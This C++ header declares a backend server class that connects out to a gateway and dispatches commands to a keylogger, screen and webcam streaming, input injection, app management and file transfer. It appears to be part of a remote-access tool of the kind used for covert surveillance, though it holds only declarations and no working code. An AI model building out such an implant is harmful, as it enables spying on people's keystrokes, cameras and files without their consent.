#pragma once
#include <memory>
#include <thread>
#include <atomic>
#include <vector>
#include <unordered_map>
#include <mutex>
#include "core/BroadcastBus.hpp"
#include "core/StreamSession.hpp"
#include "interfaces/IKeylogger.hpp"
#include "interfaces/IAppManager.hpp"
#include "interfaces/IInputInjector.hpp"
#include "interfaces/IFileTransfer.hpp"
#include "core/CommandDispatcher.hpp"

#include "core/NetworkDefs.hpp"

namespace core {

    class BackendServer {
    public:
        BackendServer(
            std::string gateway_host,
            uint16_t port,
            std::shared_ptr<BroadcastBus> bus_monitor,
            std::shared_ptr<BroadcastBus> bus_webcam,
            std::shared_ptr<StreamSession> session,
            std::shared_ptr<StreamSession> webcam_session,
            std::shared_ptr<interfaces::IKeylogger> keylogger,
            std::shared_ptr<interfaces::IAppManager> app_manager,
            std::shared_ptr<interfaces::IInputInjector> input_injector,
            std::shared_ptr<interfaces::IFileTransfer> file_transfer
        );
        ~BackendServer();

        // Blocking call (runs the connection loop)
        void run();

        // Signals stop
        void stop();

    private:
        socket_t connect_to_gateway();
        void handle_connection(socket_t fd);

        // Protocol Helpers
        bool read_frame(socket_t fd, std::vector<uint8_t>& payload, uint32_t& cid, uint32_t& bid);
        bool send_frame(socket_t fd, const uint8_t* payload, uint32_t len, uint32_t cid, uint32_t bid);

    private:
        std::string gateway_host_;
        uint16_t gateway_port_;
        std::atomic<bool> running_{false};
        std::shared_ptr<BroadcastBus> bus_monitor_;
        std::shared_ptr<BroadcastBus> bus_webcam_;
        std::shared_ptr<StreamSession> session_;
        std::shared_ptr<StreamSession> webcam_session_;
        std::shared_ptr<interfaces::IKeylogger> keylogger_;
        std::shared_ptr<interfaces::IAppManager> app_manager_;
        std::shared_ptr<interfaces::IInputInjector> input_injector_;
        std::shared_ptr<interfaces::IFileTransfer> file_transfer_;
        std::unique_ptr<command::CommandDispatcher> dispatcher_;
    };

} // namespace core
